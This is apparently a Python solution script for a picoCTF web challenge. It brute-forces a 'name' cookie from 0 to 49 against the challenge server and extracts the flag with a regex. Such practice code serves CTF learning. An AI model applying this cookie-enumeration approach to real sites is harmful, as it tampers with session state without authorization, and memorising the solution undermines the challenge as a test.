# Cookie incrementing till we get flag
import requests
from time import sleep
import re


def main():
    url = "http://mercury.picoctf.net:29649/"
    for x in range(50):
        cookie = {"name": str(x)}
        r = requests.get(url, cookies=cookie)
        if "Not very special" not in r.text:

            flag = re.findall("picoCTF{.*}", r.text)[0]
            print(flag)
            break


main()
